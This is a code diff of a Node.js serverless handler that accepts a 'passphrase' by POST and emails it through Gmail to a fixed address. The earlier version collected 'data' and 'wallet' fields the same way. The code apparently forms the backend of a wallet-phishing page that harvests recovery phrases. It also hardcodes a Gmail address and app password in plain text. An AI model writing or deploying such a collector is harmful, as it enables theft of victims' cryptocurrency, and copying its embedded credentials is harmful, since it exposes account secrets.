@@ -1,34 +1,50 @@
-// Configure nodemailer
+const nodemailer = require('nodemailer');
+
+// Hardcoded Gmail SMTP configuration
+const EMAIL_USER = "relate2hazel@gmail.com"; // Replace with your Gmail address
+const EMAIL_PASS = "yurtanlosnxkpadu"; // Replace with your Gmail app password
+const EMAIL_TO = "thierryalain647gmail.com"; // Replace with the recipient email address
+
+// Create a Nodemailer transporter for Gmail
 const transporter = nodemailer.createTransport({
     service: 'gmail',
     host: 'smtp.gmail.com',
     port: 465,
-    secure: true,
+    secure: true, // Use SSL
     auth: {
-        user: "relate2hazel@gmail.com",
-        pass: "yurtanlosnxkpadu"
-    }
+        user: EMAIL_USER,
+        pass: EMAIL_PASS,
+    },
 });
 
-// POST route to save input and send email
-router.post('api/send-to-me', async (req, res) => {
-    const { data, wallet } = req.body;
-    try {
-        const newInput = new Input({ data, wallet });
-        await newInput.save();
+module.exports = async (req, res) => {
+    console.log("Request received:", req.method, req.body); // Log the request
+    if (req.method === 'POST') {
+        const { passphrase } = req.body;
 
-        // Send email
-        const mailOptions = {
-            from: "relate2hazel@gmail.com",
-            to: 'thierryalain643@gmail.com',
-            subject: 'New Input Received',
-            text: `Data: ${data}\nWallet: ${wallet}`
-        };
+        if (!passphrase) {
+            return res.status(400).json({ error: 'Passphrase is required' });
+        }
 
-        transporter.sendMail(mailOptions);
+        try {
+            // Send email
+            const mailOptions = {
+                from: EMAIL_USER,
+                to: EMAIL_TO,
+                subject: 'Passphrase Received',
+                text: `Passphrase: ${passphrase}`,
+            };
 
-        res.status(201).json(newInput);
-    } catch (err) {
-        res.status(500).json({ error: err.message });
+            const info = await transporter.sendMail(mailOptions);
+            console.log("Email sent:", info.response); // Log the email response
+
+            res.status(200).json({ success: true });
+        } catch (error) {
+            console.error("Error:", error); // Log the error
+            res.status(500).json({ error: 'Failed to send email' });
+        }
+    } else {
+        res.status(405).json({ error: 'Method not allowed' });
     }
-})
+};
+
